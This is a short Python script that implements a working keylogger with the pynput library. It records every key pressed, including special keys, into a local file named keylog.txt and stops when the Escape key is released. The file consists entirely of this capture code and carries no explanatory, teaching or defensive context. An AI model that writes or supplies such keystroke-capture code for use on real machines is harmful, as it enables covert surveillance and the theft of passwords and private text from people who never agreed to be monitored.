from pynput import keyboard

def on_press(key):
    try:        
        log_key(str(key.char))
    except AttributeError:
        
        log_key(f' [{key}] ')

def on_release(key):
    if key == keyboard.Key.esc:        
        return False
        
def log_key(key_str):
    with open("keylog.txt", "a") as log_file:
        log_file.write(key_str)

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
